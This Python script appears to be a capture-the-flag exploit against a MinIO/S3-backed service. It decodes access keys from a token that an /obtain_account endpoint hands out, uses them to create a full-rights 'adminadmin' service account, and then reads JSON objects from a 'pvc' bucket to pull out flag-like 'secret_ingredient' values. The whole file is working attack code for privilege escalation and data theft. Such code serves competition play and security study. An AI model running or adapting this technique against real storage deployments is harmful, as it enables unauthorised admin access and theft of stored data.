#!/usr/bin/env python3
import base64
import pprint
import random
import sys
import requests
import json
from minioClient import MinioS3Client

K3S_MINIO_FULL_NAME = "prototype-s3.prototype.svc.cluster.local:9000"


def main(host):

    SERVICE_URL = f"https://{host}:30081"
    MINIO_URL = f"https://{host}:30081/s3"
    
    response = requests.get(f"{SERVICE_URL}/obtain_account", verify=False)
    token = response.text.strip()

    print("Obtained token")
    
    padding = len(token) % 4
    if padding:
        token += '=' * (4 - padding)
    
    token = json.loads(base64.urlsafe_b64decode(token).decode("utf-8"))
    access_key, secret_key = token[0].split(":")

    ensure_we_have_only_one_visible_bucket_by_default(MINIO_URL, access_key, secret_key)

    print("Checked we have only one bucket")

    mc_admin = MinioS3Client(
        endpoint_with_s3=MINIO_URL,
        access_key=access_key,
        secret_key=secret_key,
        minio_internal_host=K3S_MINIO_FULL_NAME
    )

    access_key_attack = secret_key_attack = f"adminadmin{random.randint(1000, 10000)}"

    mc_admin.create_service_account(
        sa_access_key=access_key_attack,
        sa_secret_key=secret_key_attack,
    )

    print(f"Created admin account with full rights, access_key: {access_key_attack}, secret_key: {secret_key}")

    admined_client = MinioS3Client(
        endpoint_with_s3=MINIO_URL,
        access_key=access_key_attack,
        secret_key=secret_key_attack,
        minio_internal_host=K3S_MINIO_FULL_NAME
    )

    pvc_bucket = [x for x in admined_client.list_buckets() if x["name"].startswith("pvc")][0]
    print("Found pvc")
    print(pvc_bucket)
    objects = [x for x in admined_client.list_objects(pvc_bucket["name"]) if x["key"].endswith(".json")]
    print("Found objects", len(objects))

    def extract_flag(obj):
        obj = json.loads(admined_client.get_object(pvc_bucket["name"], obj["key"]))
        if type(obj) == dict:
            if flag := obj.get("secret_ingredient"):
                if flag.startswith("TEAM") or flag.endswith("="):
                    print(obj["secret_ingredient"])
                    return obj["secret_ingredient"]

        return None

    
    flags = (extract_flag(obj) for obj in objects)

    return [x for x in flags if x is not None and x.startswith("TEAM0")]


def ensure_we_have_only_one_visible_bucket_by_default(minio_url, access_key, secret_key):
    mc = MinioS3Client(
        endpoint_with_s3=minio_url,
        access_key=access_key,
        secret_key=secret_key,
        minio_internal_host=K3S_MINIO_FULL_NAME
    )

    assert len(mc.list_buckets()) == 1, "More than one bucket exists"


if __name__ == '__main__':
    pprint.pprint(main(sys.argv[1]))